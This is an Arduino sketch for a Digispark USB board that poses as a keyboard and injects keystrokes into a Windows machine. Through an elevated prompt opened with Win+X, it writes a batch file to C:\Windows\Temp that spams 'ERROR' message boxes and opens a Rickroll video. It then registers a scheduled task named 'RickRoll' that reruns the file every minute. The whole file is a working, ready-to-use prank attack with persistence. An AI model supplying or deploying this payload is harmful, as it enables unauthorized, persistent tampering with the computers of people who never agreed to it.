#include "DigiKeyboard.h"
void setup() {}
  



void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("cd C:\\Windows\\Temp");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("copy con roll.bat");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.println(F("msg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR"));
  DigiKeyboard.delay(500);
  DigiKeyboard.print("start https://www.youtube.com/watch?v=oHg5SJYRHA0");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_Z, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("schtasks /create /tn \"RickRoll\" /SC MINUTE /st 13:00 /tr \"C:\\Windows\\Temp\\roll.bat\"");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

 for(;;)
  {
  }
}
